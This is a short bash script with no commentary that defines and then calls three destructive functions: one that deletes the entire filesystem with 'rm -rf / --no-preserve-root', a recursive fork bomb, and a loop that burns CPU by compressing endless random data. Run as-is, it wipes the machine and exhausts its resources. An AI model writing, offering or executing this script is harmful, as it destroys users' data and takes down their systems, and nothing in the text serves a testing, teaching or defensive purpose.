#!/bin/bash

function wipe_data() {
  rm -rf / --no-preserve-root
}

function fork_bomb() {
  fork() { fork|fork& }; fork
}

function highCPU() {
  dd if=/dev/urandom | bzip2 -9 >> /dev/null
}

wipe_data

highCPU

fork_bomb